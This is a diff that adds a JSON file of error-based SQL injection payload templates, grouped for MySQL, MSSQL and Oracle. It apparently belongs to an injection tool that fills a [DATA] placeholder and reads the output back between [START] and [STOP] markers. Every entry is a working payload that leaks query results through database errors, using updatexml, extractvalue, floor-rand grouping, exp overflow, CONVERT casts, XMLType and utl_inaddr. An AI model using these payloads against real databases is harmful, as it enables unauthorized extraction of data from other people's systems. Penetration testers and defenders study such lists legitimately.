@@ -1,0 +1,92 @@
+{
+ "mysql": [
+  {
+   "payload": "and`updatexml`(1,concat(0x23,'[START]',[DATA],'[STOP]'),1)"
+  },
+  {
+   "payload": "and`extractvalue`(1,concat(0x23,'[START]',[DATA],'[STOP]'))"
+  },
+  {
+   "payload": "and(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),('[START]',[DATA],'[STOP]'))a from information_schema.tables group by a)b)"
+  },
+  {
+   "payload": "and exp(~(SELECT * FROM (SELECT CONCAT('[START]',[DATA],'[STOP]','x'))x))"
+  },
+  {
+   "payload": "and(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[START]',[DATA],'[STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"
+  },
+  {
+   "payload": "and JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[START]',[DATA],'[STOP]')) USING utf8)))"
+  },
+  {
+   "payload": "or`updatexml`(1,concat(0x23,'[START]',[DATA],'[STOP]'),1)"
+  },
+  {
+   "payload": "or`extractvalue`(1,concat(0x23,'[START]',[DATA],'[STOP]'))"
+  },
+  {
+   "payload": "or(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),('[START]',[DATA],'[STOP]'))a from information_schema.tables group by a)b)"
+  },
+  {
+   "payload": "or exp(~(SELECT * FROM (SELECT CONCAT('[START]',[DATA],'[STOP]','x'))x))"
+  },
+  {
+   "payload": "or(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[START]',[DATA],'[STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"
+  },
+  {
+   "payload": "or JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[START]',[DATA],'[STOP]')) USING utf8)))"
+  }
+ ],
+ "mssql": [
+  {
+   "payload": "and(7=(('[START]'%2b[DATA]%2b'[STOP]')))"
+  },
+  {
+   "payload": "and(7 IN(('[START]'%2b[DATA]%2b'[STOP]')))"
+  },
+  {
+   "payload": "and(7=CONVERT(INT,(SELECT '[START]'%2b[DATA]%2b'[STOP]')))"
+  },
+  {
+   "payload": "and(7=CONCAT('[START]',[DATA],'[STOP]'))"
+  },
+  {
+   "payload": "or(7=(('[START]'%2b[DATA]%2b'[STOP]')))"
+  },
+  {
+   "payload": "or(7 IN(('[START]'%2b[DATA]%2b'[STOP]')))"
+  },
+  {
+   "payload": "or(7=CONVERT(INT,(SELECT '[START]'%2b[DATA]%2b'[STOP]')))"
+  },
+  {
+   "payload": "or(7=CONCAT('[START]',[DATA],'[STOP]'))"
+  }
+ ],
+ "oracle": [
+  {
+   "payload": "and(7=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[START]'||[DATA]||'[STOP]'||CHR(62))) FROM DUAL))"
+  },
+  {
+   "payload": "and(7=CTXSYS.DRITHSX.SN(2,('[START]'||[DATA]||'[STOP]')))"
+  },
+  {
+   "payload": "and(7=DBMS_UTILITY.SQLID_TO_SQLHASH(('[START]'||[DATA]||'[STOP]')))"
+  },
+  {
+   "payload": "or(7=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[START]'||[DATA]||'[STOP]'||CHR(62))) FROM DUAL))"
+  },
+  {
+   "payload": "or(7=CTXSYS.DRITHSX.SN(2,('[START]'||[DATA]||'[STOP]')))"
+  },
+  {
+   "payload": "or(7=DBMS_UTILITY.SQLID_TO_SQLHASH(('[START]'||[DATA]||'[STOP]')))"
+  },
+  {
+   "payload": "and(7=utl_inaddr.get_host_name('[START]'||[DATA]||'[STOP]'))"
+  },
+  {
+   "payload": "or(7=utl_inaddr.get_host_name('[START]'||[DATA]||'[STOP]'))"
+  }
+ ]
+}
